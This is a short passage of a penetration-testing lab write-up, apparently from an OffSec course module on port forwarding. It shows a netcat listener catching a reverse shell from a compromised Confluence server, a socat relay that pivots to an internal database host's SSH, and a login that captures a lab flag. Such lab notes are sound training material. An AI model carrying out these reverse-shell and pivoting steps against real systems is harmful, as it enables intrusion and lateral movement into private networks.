...
└─# nc -lvnp 4444          
listening on [any] 4444 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.129.63] 46086
bash: cannot set terminal process group (2562): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.129.215:22
<bin$ socat TCP-LISTEN:2222,fork TCP:10.4.129.215:22 
```

2. Conexion por ssh
```bash
┌──(root㉿kali)-[/home/kali/OffSec/19-PortForwarding-SSHTunneling/19.2.3-PortForwarding-Socat]
└─# ssh database_admin@192.168.129.63 -p2222
The authenticity of host '[192.168.129.63]:2222 ([192.168.129.63]:2222)' can't be established.
...
Warning: Permanently added '[192.168.129.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.129.63's password: 
 ...
 * Support:        https://ubuntu.com/advantage
  ...
  System information as of Mon 30 Jun 2025 05:51:31 PM UTC

  System load:  0.0               Processes:               233
  Usage of /:   80.5% of 6.79GB   Users logged in:         0
  Memory usage: 15%               IPv4 address for ens192: 10.4.129.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.129.254
...
OS{ad45f7767b49017df7c7a5b18c620743}
database_admin@pgdatabase01:~$ 
```
